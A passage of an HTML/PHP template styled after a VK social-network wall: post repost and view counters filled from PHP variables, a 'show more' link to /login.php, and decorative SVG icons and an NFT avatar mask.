                                             <svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
                                                <g fill="none" fill-rule="evenodd">
                                                   <path d="M0 0h24v24H0z"></path>
                                                   <path d="M12 3.73c-1.12.07-2 1-2 2.14v2.12h-.02a9.9 9.9 0 0 0-7.83 10.72.9.9 0 0 0 1.61.46l.19-.24a9.08 9.08 0 0 1 5.84-3.26l.2-.03.01 2.5a2.15 2.15 0 0 0 3.48 1.69l7.82-6.14a2.15 2.15 0 0 0 0-3.38l-7.82-6.13c-.38-.3-.85-.46-1.33-.46zm.15 1.79c.08 0 .15.03.22.07l7.82 6.14a.35.35 0 0 1 0 .55l-7.82 6.13a.35.35 0 0 1-.57-.28V14.7a.9.9 0 0 0-.92-.9h-.23l-.34.02c-2.28.14-4.4.98-6.12 2.36l-.17.15.02-.14a8.1 8.1 0 0 1 6.97-6.53.9.9 0 0 0 .79-.9V5.87c0-.2.16-.35.35-.35z" fill="currentColor" fill-rule="nonzero"></path>
                                                </g>
                                             </svg>
                                          </div>
                                       </span>
                                       <span class="PostBottomButton__label" aria-hidden="true"><?= $value['reposts']; ?></span>
                                    </a>
                                 </div>
                              </div>
                              <div class="PostRowBottomButtons__views"><span class=" wall_item_views"><span class="Socials__icon Socials__icon_views"></span><span class="Socials__count Socials__viewsCount"><?= $value['views']; ?></span></span></div>
                           </div>
                        </div>
                     </div>

              <?php endforeach; ?>
              <div class="show_more_wrap" bis_skin_checked="1"><a class="show_more" href="/login.php" rel="noopener">Показать ещё</a></div>
              

              
                  
      </div>
      <div id="vk_utils"></div>
      <div id="z"></div>
      <div id="MediaView_container"></div>
      <div id="vk_bottom"></div>
      <div id="theme_color_shim"></div>
      <div style="position: absolute; left: -9999; top: 0; height: 0; width: 0; overflow: hidden;">
         <svg class="NftAvatar__asset" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" fill="currentColor" viewBox="0 0 100 100">
            <defs>
               <lineargradient id="nftMountBg" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop stop-color="#2EE6A8"></stop>
                  <stop offset="0.34375" stop-color="#3399FF"></stop>
                  <stop offset="0.692708" stop-color="#9933FF"></stop>
                  <stop offset="1" stop-color="#FF3399"></stop>
               </lineargradient>
               <clippath clipPathUnits="objectBoundingBox" id="nftClipMask">
                  <path d="M0.314,0.034 A0.118,0.118,0,0,1,0.428,0.004 l0.382,0.102 a0.118,0.118,0,0,1,0.083,0.083 l0.102,0.382 a0.118,0.118,0,0,1,-0.03,0.114 L0.686,0.966 a0.118,0.118,0,0,1,-0.114,0.03 l-0.382,-0.102 a0.118,0.118,0,0,1,-0.083,-0.083 L0.004,0.428 a0.118,0.118,0,0,1,0.03,-0.114 L0.314,0.034"></path>
               </clippath>
            </defs>
            <path vector-effect="non-scaling-stroke" paint-order="fill" id="nftMount" d="M31.434 3.447A11.77 11.77 0 0 1 42.802.401l38.23 10.244a11.77 11.77 0 0 1 8.323 8.322l10.244 38.23a11.77 11.77 0 0 1-3.046 11.369L68.566 96.553a11.77 11.77 0 0 1-11.368 3.046l-38.23-10.244a11.77 11.77 0 0 1-8.323-8.322L.401 42.803a11.77 11.77 0 0 1 3.046-11.369L31.434 3.447Z"></path>
         </svg>
      </div>
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position:absolute;width:0;height:0" aria-hidden="true" id="__SVG_SPRITE_NODE__"></svg>
   </body>
</html>